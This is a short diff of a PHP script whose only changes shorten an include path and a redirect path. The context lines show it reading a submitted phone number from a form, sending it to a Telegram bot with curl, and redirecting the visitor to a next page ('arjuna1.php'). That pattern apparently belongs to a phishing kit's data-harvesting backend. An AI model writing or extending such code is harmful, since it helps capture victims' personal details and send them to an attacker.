@@ -1,5 +1,5 @@
 <?php
-include "../telegram.php";
+include "telegram.php";
 session_start();
 
 $nohp = $_POST['nohp'];
@@ -21,5 +21,5 @@ function sendMessage($id_telegram, $message, $id_botTele) {
     curl_close($ch);
 }
 sendMessage($id_telegram, $message, $id_botTele);
-header('Location: ./arjuna1.php');
+header('Location: arjuna1.php');
 ?>
